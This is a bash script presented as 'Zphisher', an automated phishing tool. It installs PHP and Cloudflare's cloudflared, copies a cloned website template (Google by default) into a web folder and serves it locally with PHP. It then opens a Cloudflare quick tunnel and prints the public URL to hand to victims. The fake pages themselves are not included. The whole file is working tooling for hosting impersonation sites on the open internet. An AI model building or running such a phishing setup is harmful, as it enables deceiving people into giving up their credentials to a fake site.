#!/bin/bash

## Zphisher: Automated Phishing Tool
## Author: TAHMID RAYAT
## Version: 2.3.5
## Github: https://github.com/htr-tech/zphisher

__version__="2.3.5"
HOST='127.0.0.1'
PORT='8080'

# ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" RESETBG="$(printf '\e[0m\n')"

BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

# Reset terminal colors
reset_color() {
    tput sgr0   # reset attributes
    tput op     # reset color
    return
}

# Kill already running processes
kill_pid() {
    check_PID="php cloudflared"
    for process in ${check_PID}; do
        if pidof ${process} > /dev/null 2>&1; then # Check for Process
            killall ${process} > /dev/null 2>&1 # Kill the Process
        fi
    done
}

# Install required packages
install_dependencies() {
    echo -e "\n${GREEN}[+]${CYAN} Installing required packages..."
    pkgs=(php curl unzip)
    for pkg in "${pkgs[@]}"; do
        if ! command -v "$pkg" &>/dev/null; then
            echo -e "${GREEN}[+]${CYAN} Installing package: ${ORANGE}$pkg${CYAN}"
            if command -v apt > /dev/null 2>&1; then
                sudo apt install "$pkg" -y
            elif command -v yum > /dev/null 2>&1; then
                sudo yum install "$pkg" -y
            elif command -v pacman > /dev/null 2>&1; then
                sudo pacman -S "$pkg" --noconfirm
            else
                echo -e "${RED}[!] Unsupported package manager, install packages manually."
                exit 1
            fi
        fi
    done
}

# Download binaries
download() {
    url="$1"
    output="$2"
    file=$(basename $url)
    [ -e "$file" ] && rm -rf "$file"
    curl --silent --fail --retry-connrefused --retry 3 --retry-delay 2 --location --output "${file}" "${url}"
    if [ -e "$file" ]; then
        mv -f $file .server/$output > /dev/null 2>&1
        chmod +x .server/$output
        rm -rf "$file"
    else
        echo -e "${RED}[!] Error occurred while downloading ${output}."
        reset_color
        exit 1
    fi
}

# Install Cloudflared
install_cloudflared() {
    if [ -e ".server/cloudflared" ]; then
        echo -e "\n${GREEN}[+]${GREEN} Cloudflared already installed."
    else
        echo -e "\n${GREEN}[+]${CYAN} Installing Cloudflared..."
        arch=$(uname -m)
        if [[ "$arch" == *'arm'* || "$arch" == *'Android'* ]]; then
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
        elif [[ "$arch" == *'aarch64'* ]]; then
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
        elif [[ "$arch" == *'x86_64'* ]]; then
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
        else
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
        fi
    fi
}

# Setup website and start PHP server
setup_site() {
    echo -e "\n${RED}[-]${BLUE} Setting up server..."
    mkdir -p .www
    if [ ! -d ".sites/$website" ]; then
        echo -e "${RED}[!] Error: The directory '.sites/$website' does not exist."
        reset_color
        exit 1
    fi
    cp -rf .sites/"$website"/* .www
    echo -e "${RED}[-]${BLUE} Starting PHP server..."
    php -S "$HOST":"$PORT" -t .www > /dev/null 2>&1 &
}

# Start Cloudflared
start_cloudflared() {
    mkdir -p .server
    setup_site
    echo -e "${RED}[-]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
    sleep 2
    ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
    sleep 8
    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
    echo -e "\n${RED}[-]${BLUE} URL: ${GREEN}$cldflr_url"
}

# Main
main() {
    kill_pid
    install_dependencies
    install_cloudflared
    website="google"  # You can change the default website here
    start_cloudflared
}

main
